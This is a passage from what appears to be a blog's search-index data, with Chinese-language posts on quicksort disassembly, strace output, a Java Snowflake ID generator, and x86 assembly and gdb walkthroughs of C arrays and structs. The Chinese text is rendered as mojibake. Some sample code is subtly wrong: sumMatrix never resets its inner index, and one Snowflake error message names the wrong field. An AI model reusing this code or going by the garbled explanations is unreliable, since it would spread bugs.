e0 mov -0x20(%rbp),%edx ; edx = endIndex ç¬¬ä¸‰ä¸ªå‚æ•° 84d:\t48 8b 45 e8 mov -0x18(%rbp),%rax ; rax = \u0026array[0] 851:\t89 ce mov %ecx,%esi ; esi = pivotIndex + 1 ç¬¬äºŒä¸ªå‚æ•° 853:\t48 89 c7 mov %rax,%rdi ; rdi = \u0026array[0] ç¬¬ä¸€ä¸ªå‚æ•° 856:\te8 a1 ff ff ff callq 7fc \u003cquickSort\u003e ; quickSort(array, pivotIndex + 1, endIndex) 85b:\teb 01 jmp 85e \u003cquickSort+0x62\u003e 85d:\t90 nop 85e:\tc9 leaveq 85f:\tc3 retq 0000000000000860 \u003cmain\u003e: 860:\t55 push %rbp 861:\t48 89 e5 mov %rsp,%rbp 864:\t48 83 ec 40 sub $0x40,%rsp ; åˆ†é… 64Bytes ç©ºé—´ã€‚ 868:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 86f:\t00 00 871:\t48 89 45 f8 mov %rax,-0x8(%rbp) 875:\t31 c0 xor %eax,%eax 877:\tc7 45 d0 04 00 00 00 movl $0x4,-0x30(%rbp) ; array[0] = 4 87e:\tc7 45 d4 07 00 00 00 movl $0x7,-0x2c(%rbp) ; array[1] = 7 885:\tc7 45 d8 06 00 00 00 movl $0x6,-0x28(%rbp) ; array[2] = 6 88c:\tc7 45 dc 05 00 00 00 movl $0x5,-0x24(%rbp) ; array[3] = 5 893:\tc7 45 e0 03 00 00 00 movl $0x3,-0x20(%rbp) ; array[4] = 3 89a:\tc7 45 e4 02 00 00 00 movl $0x2,-0x1c(%rbp) ; array[5] = 2 8a1:\tc7 45 e8 08 00 00 00 movl $0x8,-0x18(%rbp) ; array[6] = 8 8a8:\tc7 45 ec 01 00 00 00 movl $0x1,-0x14(%rbp) ; array[7] = 1 8af:\t48 8d 45 d0 lea -0x30(%rbp),%rax ; rax = \u0026array[0] 8b3:\tba 07 00 00 00 mov $0x7,%edx ; edx = endIndex = 7 8b8:\tbe 00 00 00 00 mov $0x0,%esi ; esi = startIndex = 0 8bd:\t48 89 c7 mov %rax,%rdi ; rdi = rax = \u0026array[0] 8c0:\te8 37 ff ff ff callq 7fc \u003cquickSort\u003e 8c5:\tc7 45 cc 00 00 00 00 movl $0x0,-0x34(%rbp) ; i = 0 8cc:\teb 20 jmp 8ee \u003cmain+0x8e\u003e 8ce:\t8b 45 cc mov -0x34(%rbp),%eax 8d1:\t48 98 cltq 8d3:\t8b 44 85 d0 mov -0x30(%rbp,%rax,4),%eax 8d7:\t89 c6 mov %eax,%esi 8d9:\t48 8d 3d b4 00 00 00 lea 0xb4(%rip),%rdi # 994 \u003c_IO_stdin_used+0x4\u003e 8e0:\tb8 00 00 00 00 mov $0x0,%eax 8e5:\te8 96 fc ff ff callq 580 \u003cprintf@plt\u003e 8ea:\t83 45 cc 01 addl $0x1,-0x34(%rbp) 8ee:\t83 7d cc 07 cmpl $0x7,-0x34(%rbp) 8f2:\t7e da jle 8ce \u003cmain+0x6e\u003e 8f4:\tb8 00 00 00 00 mov $0x0,%eax 8f9:\t48 8b 4d f8 mov -0x8(%rbp),%rcx 8fd:\t64 48 33 0c 25 28 00 xor %fs:0x28,%rcx 904:\t00 00 906:\t74 05 je 90d \u003cmain+0xad\u003e 908:\te8 63 fc ff ff callq 570 \u003c__stack_chk_fail@plt\u003e 90d:\tc9 leaveq 90e:\tc3 retq 90f:\t90 nop 0000000000000910 \u003c__libc_csu_init\u003e: 910:\t41 57 push %r15 912:\t41 56 push %r14 914:\t49 89 d7 mov %rdx,%r15 917:\t41 55 push %r13 919:\t41 54 push %r12 91b:\t4c 8d 25 8e 04 20 00 lea 0x20048e(%rip),%r12 # 200db0 \u003c__frame_dummy_init_array_entry\u003e 922:\t55 push %rbp 923:\t48 8d 2d 8e 04 20 00 lea 0x20048e(%rip),%rbp # 200db8 \u003c__init_array_end\u003e 92a:\t53 push %rbx 92b:\t41 89 fd mov %edi,%r13d 92e:\t49 89 f6 mov %rsi,%r14 931:\t4c 29 e5 sub %r12,%rbp 934:\t48 83 ec 08 sub $0x8,%rsp 938:\t48 c1 fd 03 sar $0x3,%rbp 93c:\te8 07 fc ff ff callq 548 \u003c_init\u003e 941:\t48 85 ed test %rbp,%rbp 944:\t74 20 je 966 \u003c__libc_csu_init+0x56\u003e 946:\t31 db xor %ebx,%ebx 948:\t0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 94f:\t00 950:\t4c 89 fa mov %r15,%rdx 953:\t4c 89 f6 mov %r14,%rsi 956:\t44 89 ef mov %r13d,%edi 959:\t41 ff 14 dc callq *(%r12,%rbx,8) 95d:\t48 83 c3 01 add $0x1,%rbx 961:\t48 39 dd cmp %rbx,%rbp 964:\t75 ea jne 950 \u003c__libc_csu_init+0x40\u003e 966:\t48 83 c4 08 add $0x8,%rsp 96a:\t5b pop %rbx 96b:\t5d pop %rbp 96c:\t41 5c pop %r12 96e:\t41 5d pop %r13 970:\t41 5e pop %r14 972:\t41 5f pop %r15 974:\tc3 retq 975:\t90 nop 976:\t66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 97d:\t00 00 00 0000000000000980 \u003c__libc_csu_fini\u003e: 980:\tf3 c3 repz retq Disassembly of section .fini: 0000000000000984 \u003c_fini\u003e: 984:\t48 83 ec 08 sub $0x8,%rsp 988:\t48 83 c4 08 add $0x8,%rsp 98c:\tc3 retq partition åˆ†æ Before:: [4, 7, 6, 5, 3, 2, 8, 1]\rç¬¬ 1 æ¬¡ partition [3, 1, 2, 4, 5, 6, 8, 7] returned index is: 3\rç¬¬ 2 æ¬¡ partition [2, 1, 3, 4, 5, 6, 8, 7] returned index is: 2\rç¬¬ 3 æ¬¡ partition [1, 2, 3, 4, 5, 6, 8, 7] returned index is: 1\rç¬¬ 4 æ¬¡ partition [1, 2, 3, 4, 5, 6, 8, 7] returned index is: 4\rç¬¬ 5 æ¬¡ partition [1, 2, 3, 4, 5, 6, 8, 7] returned index is: 5\rç¬¬ 6 æ¬¡ partition [1, 2, 3, 4, 5, 6, 7, 8] returned index is: 7\rAfter:: [1, 2, 3, 4, 5, 6, 7, 8] partition é€»è¾‘å›¾è§£ ç³»ç»Ÿè°ƒç”¨ strace åˆ†æ root@aliyun:~# strace -Ti ./quickSort [00007f2ee3f68e37] execve(\"./quickSort\", [\"./quickSort\"], 0x7ffffe4dc528 /* 27 vars */) = 0 \u003c0.000122\u003e\r[00007f0045366ec9] brk(NULL) = 0x55e15d32b000 \u003c0.000006\u003e\r[00007f004535a7de] access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) \u003c0.000010\u003e\r[00007f0045367e27] access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) \u003c0.000007\u003e\r[00007f0045367cdd] openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3 \u003c0.000008\u003e\r[00007f0045367c43] fstat(3, {st_mode=S_IFREG|0644, st_size=39490, ...}) = 0 \u003c0.000006\u003e\r[00007f0045367f43] mmap(NULL, 39490, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f0045568000 \u003c0.000009\u003e\r[00007f0045367ed7] close(3) = 0 \u003c0.000005\u003e\r[00007f0045363139] access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) \u003c0.000008\u003e\r[00007f0045367cdd] openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 \u003c0.000012\u003e\r[00007f0045367da4] read(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\u003e\\0\\1\\0\\0\\0\\260\\34\\2\\0\\0\\0\\0\\0\"..., 832) = 832 \u003c0.000007\u003e\r[00007f0045367c43] fstat(3, {st_mode=S_IFREG|0755, st_size=2030544, ...}) = 0 \u003c0.000006\u003e\r[00007f0045367f43] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0045566000 \u003c0.000007\u003e\r[00007f0045367f43] mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f0044f5a000 \u003c0.000008\u003e\r[00007f0045367ff7] mprotect(0x7f0045141000, 2097152, PROT_NONE) = 0 \u003c0.000012\u003e\r[00007f0045367f43] mmap(0x7f0045341000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7f0045341000 \u003c0.000011\u003e\r[00007f0045367f43] mmap(0x7f0045347000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f0045347000 \u003c0.000008\u003e\r[00007f0045367ed7] close(3) = 0 \u003c0.000007\u003e\r[00007f004534c024] arch_prctl(ARCH_SET_FS, 0x7f00455674c0) = 0 \u003c0.000006\u003e\r[00007f0045367ff7] mprotect(0x7f0045341000, 16384, PROT_READ) = 0 \u003c0.000009\u003e\r[00007f0045367ff7] mprotect(0x55e15d271000, 4096, PROT_READ) = 0 \u003c0.000008\u003e\r[00007f0045367ff7] mprotect(0x7f0045572000, 4096, PROT_READ) = 0 \u003c0.000011\u003e\r[00007f0045367fd7] munmap(0x7f0045568000, 39490) = 0 \u003c0.000015\u003e\r[00007f00450697c3] fstat(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0 \u003c0.000006\u003e\r[00007f00450704b9] brk(NULL) = 0x55e15d32b000 \u003c0.000006\u003e\r[00007f00450704b9] brk(0x55e15d34c000) = 0x55e15d34c000 \u003c0.000007\u003e\r[00007f004506a154] write(1, \"1 2 3 4 5 6 7 8 \", 161 2 3 4 5 6 7 8 ) = 16 \u003c0.000024\u003e\r[00007f004503ee06] exit_group(0) = ?\r[????????????????] +++ exited with 0 +++ reference system-call-execve system-call-brk system-call-access "},"title":"algorithm-quick-sort"},"/blog/algorithm-snowflake/":{"data":{"åˆ†å¸ƒå¼-id#åˆ†å¸ƒå¼ ID":"åˆ†å¸ƒå¼ ID å¤šä¸ªæ•°æ®ä¸­å¿ƒ(ä¸€çº§)ï¼Œå¤šä¸ªèŠ‚ç‚¹(ä¸€çº§)ï¼ŒåŒä¸€ä¸ªæ—¶é—´ç‚¹ï¼ˆä¸€çº§ï¼‰ï¼ŒåŒæ—¶ç”Ÿæˆ ID(ä¸€çº§)ã€‚å…¶å®å°±æ˜¯æ•°å­—ç”Ÿæˆè§„åˆ™è€Œå·²ã€‚æ²¡å•¥äº†ä¸èµ·çš„ã€‚\nsnowflake ç®—æ³•ä½¿ç”¨ä¸€ä¸ª 64bits çš„æ­£æ•´æ•°ä½œä¸º IDã€‚64bits æ­£æ•´æ•° layout å¦‚ä¸‹ï¼š\npackage stardustman.github.io; public class SnowFlake { // èµ·å§‹çš„æ—¶é—´æˆ³ private final static long START_STAMP = 1480166465631L; // sequence number private final static long SEQUENCE_BIT = 12; // machine id bits private final static long MACHINE_BIT = 5; // data-center id bits private final static long DATA_CENTER_BIT = 5; // æ¯ä¸€éƒ¨åˆ†æœ€å¤§å€¼ private final static long MAX_SEQUENCE_NUM = ~(-1L \u003c\u003c SEQUENCE_BIT); private final static long MAX_MACHINE_NUM = ~(-1L \u003c\u003c MACHINE_BIT); private final static long MAX_DATA_CENTER_NUM = ~(-1L \u003c\u003c DATA_CENTER_BIT); // æ¯ä¸€éƒ¨åˆ†å·¦ç§»ä½æ•° private final static long MACHINE_LEFT = SEQUENCE_BIT; private final static long DATA_CENTER_LEFT = SEQUENCE_BIT + MACHINE_BIT; private final static long TIMESTAMP_LEFT = DATA_CENTER_LEFT + DATA_CENTER_BIT; private final long dataCenterId; private final long machineId; private long sequence = 0L; private long lastStamp = -1L; public SnowFlake(long dataCenterId, long machineId){ if (dataCenterId \u003e MAX_DATA_CENTER_NUM || dataCenterId \u003c 0){ throw new IllegalArgumentException(\"dataCenterId can't be greater than MAX_DATA_CENTER_ID or less than 0\" ); } if (machineId \u003e MAX_MACHINE_NUM || machineId \u003c 0){ throw new IllegalArgumentException(\"dataCenterId can't be greater than MAX_DATA_CENTER_ID or less than 0\" ); } this.dataCenterId = dataCenterId; this.machineId = machineId; } // generate next ID public synchronized long nextId(){ long currStamp = getNewStamp(); if (currStamp \u003c lastStamp){ throw new RuntimeException(\"clock moved backwards. Refusing to generate id\"); } if (currStamp == lastStamp) { // åŒä¸€ä¸ªæ¯«ç§’å†…,åºå·é€’å¢ï¼Œsequence æœ€å¤§æ˜¯ 4095 sequence = (sequence + 1) \u0026 MAX_SEQUENCE_NUM; // åŒä¸€æ¯«ç§’å†…ï¼Œåºåˆ—ä¹¦å·²ç»åˆ°æœ€å¤§ if (sequence == 0L){ // é˜»å¡åˆ°ä¸‹ä¸€ä¸ªæ¯«ç§’ï¼Œè·å–æ–°çš„æ—¶é—´æˆ³ currStamp = getNextMill(); } } else { // ä¸åŒæ¯«ç§’ï¼Œåºåˆ—å·ç½®ä¸º 0 sequence = 0L; } lastStamp = currStamp; // assemble 64bits id return (currStamp - START_STAMP) \u003c\u003c TIMESTAMP_LEFT | dataCenterId \u003c\u003c DATA_CENTER_LEFT | machineId \u003c\u003c MACHINE_LEFT | sequence; } private long getNextMill(){ long mill = getNewStamp(); while (mill \u003c= lastStamp){ mill = getNewStamp(); } return mill; } private long getNewStamp(){ return System.currentTimeMillis(); } public static void main(String[] args) { SnowFlake snowFlake = new SnowFlake(11,11); long start = System.currentTimeMillis(); for (int i = 0; i \u003c 10 ; i++) { System.out.println(snowFlake.nextId()); } System.out.println(System.currentTimeMillis() - start); System.out.println(MAX_SEQUENCE_NUM); System.out.println(MAX_MACHINE_NUM); System.out.println(MAX_DATA_CENTER_NUM); } } "},"title":"Algorithm Snowflake"},"/blog/asm-clang-concepts/":{"data":{"array#array":"","asm-ä»£ç åˆ†æ#Asm ä»£ç åˆ†æ":"sumArray sumArray(long*, long): pushq %rbp movq %rsp, %rbp movq %rdi, -24(%rbp) ; \u0026a[0] movq %rsi, -32(%rbp) ; length of a movl $0, -4(%rbp) ; sum movl $0, -8(%rbp) ; i .L3: movl -8(%rbp), %eax ; i cltq cmpq %rax, -32(%rbp) ; cmpq i, length å…¶å®ä¹Ÿå°±æ˜¯ i - length jle .L2 movl -8(%rbp), %eax ; i cltq leaq 0(,%rax,8), %rdx ; rdx = 0 + 8 * i movq -24(%rbp), %rax ; rax = \u0026a[0] addq %rdx, %rax ; rax = \u0026a[0] + (0 + 8 * i), åœ°å€å¢åŠ  8 * i movq (%rax), %rax ; rax = a[i] movl %eax, %edx ; edx = a[i] movl -4(%rbp), %eax ; eax = sum addl %edx, %eax ; eax = a[i] + sum movl %eax, -4(%rbp) addl $1, -8(%rbp) ; i = i + 1 jmp .L3 .L2: movl -4(%rbp), %eax ; eax = sum cltq popq %rbp ret é€šè¿‡ a[i] è®¿é—®æ•°ç»„çš„æ–¹æ³•, ä¸å…·ä½“çš„æ•°æ®ç±»å‹æœ‰å…³\nmovl -8(%rbp), %eax ; i\ncltq ; convert long(32 bit) to quad(64 bit)\nleaq 0(,%rax,8), %rdx ; rdx = 0 + 8 * i , æ¯”ä¾‹å¯»å€. 8 æ˜¯æ¯”ä¾‹å› å­,ä¹Ÿå°±æ˜¯æ•°æ®ç±»å‹çš„å­—èŠ‚æ•°,long 8 bytes.\nmovq -24(%rbp), %rax ; rax = \u0026a[0]\naddq %rdx, %rax ; rax = \u0026a[0] + (0 + 8 * i), åœ°å€å¢åŠ  8 * i\nmovq (%rax), %rax ; rax = a[i]\nAsm sumMatrix sumMatrix(int (*) [3]): pushq %rbp movq %rsp, %rbp movq %rdi, -24(%rbp) ; \u0026matrix[0][0] movl $0, -4(%rbp) ; sum = 0 movl $0, -8(%rbp) ;i = 0 movl $0, -12(%rbp);j = 0 ; å¾ªç¯ä½“å¼€å§‹ .L9: cmpl $1, -8(%rbp) ; i - 1 jg .L6 ; i - 1 \u003e 0 ;ä¹Ÿå°±æ˜¯ i = 2 æ—¶è·³åˆ° .L6, é€€å‡ºå¾ªç¯. å¦åˆ™è¿›å…¥å†…éƒ¨å¾ªç¯. .L8: cmpl $2, -12(%rbp) ; cmpl 2, j jg .L7 ; j - 2 \u003e 0 ;ä¹Ÿå°±æ˜¯ j = 3 æ—¶,å†…éƒ¨å¾ªç¯ç»“æŸ, è·³åˆ° .L7. æ”¹å˜ i, è¿›å…¥ä¸‹ä¸€è½®å¾ªç¯ movl -8(%rbp), %eax ; eax = i movslq %eax, %rdx ; rdx = i movq %rdx, %rax ; rax = i addq %rax, %rax ; rax = i + i addq %rdx, %rax ; rax = i + (i + i) salq $2, %rax ; rax = 2 * 2 * 3 * i rax ç®—æœ¯å·¦ç§» 2 ä½ movq %rax, %rdx ; rdx = 12 * i movq -24(%rbp), %rax ; rax = \u0026matrix[0][0] addq %rax, %rdx ; rdx = \u0026matrix[0][0] + 12 * i movl -12(%rbp), %eax ; eax = j cltq movl (%rdx,%rax,4), %eax ; 4 * rax + rdx = \u0026matrix[0][0] + 12 * i + 4 * j), ä¹Ÿå°±æ˜¯ \u0026matrix[i][j]. eax = matrix[i][j] addl %eax, -4(%rbp) ; sum = sum + eax addl $1, -12(%rbp) ; j = j + 1 jmp .L8 .L7: addl $1, -8(%rbp) ; i = i + 1 jmp .L9 .L6: movl -4(%rbp), %eax ; eax = sum popq %rbp ret int matrix[i][j]\nmovl -8(%rbp), %eax ; eax = i\nmovslq %eax, %rdx ; rdx = i\nmovq %rdx, %rax ; rax = i\naddq %rax, %rax ; rax = i + i\naddq %rdx, %rax ; rax = i + (i + i)\nsalq $2, %rax ; rax = 2 * 2 * 3 * i rax ç®—æœ¯å·¦ç§» 2 ä½\nmovq %rax, %rdx ; rdx = 12 * i\nmovq -24(%rbp), %rax ; rax = \u0026matrix[0][0]\naddq %rax, %rdx ; rdx = \u0026matrix[0][0] + 12 * i\nmovl -12(%rbp), %eax ; eax = j\ncltq\nmovl (%rdx,%rax,4), %eax ; 4 * rax + rdx = 4 * j + \u0026matrix[0][0] + 12 * i ), ä¹Ÿå°±æ˜¯ \u0026matrix[i][j]. eax = matrix[i][j]. sizeOf(int) = 4\nåœ¨ main ä¸­å¯çŸ¥ matrix[0][0],matrix[0][1] â€¦ matrix[1][1],matrix[1][2]é¡ºåºæ’åˆ—\nå½“ i = 0, j = 0 æ—¶ 4 * 0 + \u0026matrix[0][0] + 12 * 0 = \u0026matrix[0][0]\nå½“ i = 0, j = 1 æ—¶ 4 * 1 + \u0026matrix[0][0] + 12 * 0 = \u0026matrix[0][1]\nå½“ i = 1, j = 0 æ—¶ 4 * 0 + \u0026matrix[0][0] + 12 * 1, æ­¤æ—¶æ˜¯ \u0026matrix[0][0] + 12,\näºŒç»´æ•°ç»„æ¯ä¸€è¡Œçš„å­—èŠ‚æ€»æ•°æ˜¯: 3(æ¯ä¸€è¡Œ 3 ä¸ª int) * 4(int æ•°æ®å¤§å°), æ­¤æ—¶çš„åœ°å€æ˜¯ \u0026matrix[1][0]. C è¯­è¨€ä¸­äºŒç»´æ•°ç»„ä½œä¸ºå‡½æ•°å‚æ•°ä¼ é€’æ—¶, ä¸€å®šè¦ç»™å‡ºåˆ—çš„æ•°ç›®, ä¸éœ€è¦è¡Œæ•°. å› ä¸ºæ ¹æ®åˆ—æ•°å’Œæ•°æ®ç±»å‹çš„å¤§å°,å°±èƒ½ç®—å‡ºä¸‹ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªæ•°æ®åç§»èµ·å§‹ä½ç½®. åç§»é‡ = åˆ—æ•° * sizeOf(Data type)\nAsm main main: pushq %rbp movq %rsp, %rbp subq $96, %rsp ; åˆ†é…æ ˆç©ºé—´ movq $0, -8(%rbp) ; sum movl $0, -12(%rbp) ; sum1 movq $11, -64(%rbp) ; a[0] movq $22, -56(%rbp) ; a[1] movq $33, -48(%rbp) ; a[2] movq $44, -40(%rbp) ; a[3] movq $55, -32(%rbp) ; a[4] movl $1, -96(%rbp) ; matrix[0][0] movl $2, -92(%rbp) ; matrix[0][1] movl $3, -88(%rbp) ; matrix[0][2] movl $4, -84(%rbp) ; matrix[1][0] movl $5, -80(%rbp) ; matrix[1][1] movl $6, -76(%rbp) ; matrix[1][2] ; call sumArray leaq -64(%rbp), %rax ; a[0] çš„åœ°å€ movl $5, %esi ; length of a, ç¬¬äºŒä¸ªå‚æ•° movq %rax, %rdi ; a[0] çš„åœ°å€ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•° call sumArray(long*, long) movq %rax, -8(%rbp) ; è¿”å›å€¼å¤åˆ¶ç»™ sum ; call sumMatrix leaq -96(%rbp), %rax ; matrix[0][0] çš„åœ°å€ movq %rax, %rdi ; matrix[0][0] çš„åœ°å€ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•° call sumMatrix(int (*) [3]) movl %eax, -12(%rbp) ; è¿”å›å€¼å¤åˆ¶ç»™ sum1 movl $0, %eax leave ret ç”± main å¯ä»¥çœ‹å‡º, ç¼–è¯‘å™¨å¯¹å¾…æ•°ç»„ a , a å°±æ˜¯æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€.","c-ä»£ç #C ä»£ç ":" void test_variable_shadow(){ int a = 10; // ä»£ç å—å¼€å§‹ { int a = 100; int b = a + 1000; } // ä»£ç å—ç»“æŸ int c = a + 10000; } ","c-ä»£ç -1#C ä»£ç ":" #include\u003cstdio.h\u003e int add (int a, int b) { return a + b; } int main(void) { int(*fptr)(int,int); // Function pointer fptr = add; // Assign address to function pointer add(2,3); fptr(2,3); return 0; } ","c-ä»£ç -2#c ä»£ç ":" enum day{ monday, tuesday, wednesday, thursday, friday, saturday, sunday}; enum color { RED=1, YELLOW, GREEN }; int main(){ enum day foo = friday; enum color color = GREEN; } ","code-analysis#Code Analysis":"C typedef struct Student{ long id; long score; long age; } Student; ; ç»“æ„ä½“æŒ‡é’ˆä½œä¸ºå‚æ•° void testStruct(Student* s){ s-\u003eid = 10; s-\u003escore = 100; s-\u003eage = 1000; } ; è¿”å›ç»“æ„ä½“ Student buildStruct(long id, long score, long age){ Student s; s.id = id; s.score = score; s.age = age; return s; } int main(){ Student s ; Student ss; s.id = 1; s.score = 10; s.age = 100; testStruct(\u0026s); ss = buildStruct(11,22,33); return 0; } Asm testStruct(Student*): pushq %rbp movq %rsp, %rbp movq %rdi, -8(%rbp) ; s çš„åœ°å€ movq -8(%rbp), %rax movq $10, (%rax) ; s-\u003eid = 10 movq -8(%rbp), %rax movq $100, 8(%rax) ; s-\u003escore = 100 movq -8(%rbp), %rax movq $1000, 16(%rax) ; s-\u003eage = 1000 nop popq %rbp ret buildStruct(long, long, long): pushq %rbp movq %rsp, %rbp movq %rdi, -8(%rbp) ; main ä¸­éšæ€§å˜é‡ ss çš„åœ°å€(rbp(main) - 96) movq %rsi, -16(%rbp) ; id movq %rdx, -24(%rbp) ; score movq %rcx, -32(%rbp) ; age movq -8(%rbp), %rax movq -16(%rbp), %rdx ; id movq %rdx, (%rax) movq -8(%rbp), %rax movq -24(%rbp), %rdx ; score movq %rdx, 8(%rax) movq -8(%rbp), %rax movq -32(%rbp), %rdx ; age movq %rdx, 16(%rax) nop movq -8(%rbp), %rax ; main ä¸­éšæ€§å˜é‡ ss çš„åœ°å€ popq %rbp ret main: pushq %rbp movq %rsp, %rbp subq $96, %rsp ; åˆ†é…æ ˆç©ºé—´ movq $1, -32(%rbp) ; id movq $10, -24(%rbp) ; score movq $100, -16(%rbp) ; age leaq -32(%rbp), %rax ; ç»“æ„ä½“èµ·å§‹åœ°å€,ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªå­—èŠ‚çš„å†…å­˜åœ°å€ movq %rax, %rdi ; è¿™ä¸ªå°±ç±»ä¼¼ Java ä¸­çš„ this æŒ‡é’ˆäº† call testStruct(Student*) leaq -96(%rbp), %rax ; éšæ€§çš„å˜é‡ ss èµ·å§‹åœ°å€ movl $33, %ecx movl $22, %edx movl $11, %esi movq %rax, %rdi ; éšå½¢çš„å‚æ•°, åƒä¸åƒ Java é‡Œçš„ this å•Š. ç¼–è¯‘å™¨åŠ¨çš„æ‰‹è„š. call buildStruct(long, long, long) movq -96(%rbp), %rax ; ss.id movq -88(%rbp), %rdx ; ss.score movq %rax, -64(%rbp) movq %rdx, -56(%rbp) movq -80(%rbp), %rax ; ss.age movq %rax, -48(%rbp) movl $0, %eax leave ret ç»“æ„ä½“ä½¿ç”¨çš„æ˜¯ä¸€å—è¿ç»­çš„å†…å­˜åœ°å€. ç»“æ„ä½“æŒ‡é’ˆä¹Ÿå°±æ˜¯ç»“æ„ä½“ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€.","cä»£ç åˆ†æ#Cä»£ç åˆ†æ":"sumArray const int M = 2; const int N = 3; long sumArray(long a[], long length){ int sum = 0; for(int i=0;i \u003c length; i++){ sum += a[i]; } return sum; } sumMatrix int sumMatrix(int a[M][N]){ int sum = 0; int i = 0; int j = 0; for(;i \u003c 2;i++){ for(;j \u003c 3;j++){ sum += a[i][j]; } } return sum; } main int main(){ long sum = 0; int sum1 = 0; long a[5] = {11,22,33,44,55}; int matrix[2][3] = {{1,2,3},{4,5,6}}; sum = sumArray(a, 5); sum1 = sumMatrix(matrix); } ","enum#enum":" ç¼–è¯‘å™¨åœ¨èƒŒåæé¬¼ï¼Œè‡ªåŠ¨ä¸ºæ¯ä¸€ä¸ª enum å¸¸é‡è¿›è¡Œç¼–å·ã€‚","funcation-pointer#funcation pointer":" A function pointer can be declared as: (return type of function) (*name of pointer) (type of function arguments)","gdb-åˆ†æ-array#gdb åˆ†æ array":"arrays.c int main(){ int a[] = {1,2,3}; int b[] = {7,8,9,10}; return 0; } gdb arrays stardust@os:container$ gcc -g arrays.c -o arrays stardust@os:container$ gdb arrays For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\"... Reading symbols from arrays... (gdb) break main Breakpoint 1 at 0x1149: file arrays.c, line 1. (gdb) run Starting program: /home/stardust/Desktop/k8s/container/arrays Breakpoint 1, main () at arrays.c:1 1 int main(){ (gdb) next 2 int a[] = {1,2,3}; (gdb) print a $1 = {32767, 1431654832, 21845} (gdb) next 3 int b[] = {7,8,9,10}; (gdb) print b $2 = {0, 0, 1431654496, 21845} (gdb) next 4 return 0; (gdb) print b $3 = {7, 8, 9, 10} (gdb) ptype b # æ•°ç»„ b çš„ç±»å‹ä¸º int [4] type = int [4] (gdb) ptype a # æ•°ç»„ a çš„ç±»å‹ä¸º int [3] type = int [3] (gdb) print a $4 = {1, 2, 3} (gdb) print b $5 = {7, 8, 9, 10} (gdb) print \u0026a $6 = (int (*)[3]) 0x7fffffffdb14 (gdb) print \u0026b $7 = (int (*)[4]) 0x7fffffffdb20 (gdb) print sizeof(a) $8 = 12 (gdb) print sizeof(b) $9 = 16 (gdb) x/12xb \u0026a 0x7fffffffdb14: 0x01 0x00 0x00 0x00 0x02 0x00 0x00 0x00 0x7fffffffdb1c: 0x03 0x00 0x00 0x00 (gdb) print a + 1 # æŒ‡é’ˆè¿ç®— $10 = (int *) 0x7fffffffdb18 (gdb) print a + 2 # æŒ‡é’ˆè¿ç®— $11 = (int *) 0x7fffffffdb1c (gdb) print x/4b a + 1 (gdb) x/4xb a + 1 # æŸ¥çœ‹ a[1] 0x7fffffffdb18: 0x02 0x00 0x00 0x00 (gdb) x/4xb a # æŸ¥çœ‹ a[0] 0x7fffffffdb14: 0x01 0x00 0x00 0x00 (gdb) print a[0] $12 = 1 (gdb) print *(a + 1) $13 = 2 (gdb) print a[1] $14 = 2 (gdb) ptype \u0026a # \u0026a çš„ç±»å‹æ˜¯æŒ‡å‘ã€ 3 ä¸ª int å…ƒç´ çš„æ•°ç»„ ã€‘çš„æŒ‡é’ˆ type = int (*)[3] (gdb) ptype \u0026b type = int (*)[4] # \u0026b çš„ç±»å‹æ˜¯æŒ‡å‘ã€ 4 ä¸ª int å…ƒç´ çš„æ•°ç»„ ã€‘çš„æŒ‡é’ˆ (gdb) print a + 1 $15 = (int *) 0x7fffffffdb18 (gdb) print \u0026a + 1 # ä¸‹ä¸€ä¸ªã€ æŒ‡å‘ 3 ä¸ª int å…ƒç´ çš„æ•°ç»„çš„æŒ‡é’ˆ ã€‘çš„åœ°å€ $16 = (int (*)[3]) 0x7fffffffdb20 (gdb) print \u0026b $18 = (int (*)[4]) 0x7fffffffdb20 ","movq-operand-combinations#movq operand combinations":"","references#references":" pointer lea instruction x86 c call convention opcode-movz movsd pass-2d-array-parameter-c Variable Shadowing function pointer 5-learning-c-with-gdb ç”¨ gdb å­¦ C è¯­è¨€ ","struct#struct":" A struct in the C programming language (and many derivatives) is a composite data type (or record) declaration that defines a physically grouped list of variables to be placed under one name in a block of memory, allowing the different variables to be accessed via a single pointer, or the struct declared name which returns the same address.","variable-shadowing#Variable Shadowing":" ä»£ç å—ã€å—çº§å˜é‡","ä»£ç åˆ†æ#ä»£ç åˆ†æ":"swap void swap(int *pa, int *pb){ int temp = *pa; *pa = *pb; *pb = temp; } swap(int*, int*): pushq %rbp movq %rsp, %rbp movq %rdi, -24(%rbp) ; å°†å˜é‡ a(10) çš„åœ°å€(\u0026a)å¤åˆ¶åˆ° rbp - 24 åœ°å€å¤„, å‚æ•° pa movq %rsi, -32(%rbp) ; å°†å˜é‡ b(100) çš„åœ°å€(\u0026b)å¤åˆ¶åˆ° rbp - 32 åœ°å€å¤„, å‚æ•° pb movq -24(%rbp), %rax ; å°† rbp - 24 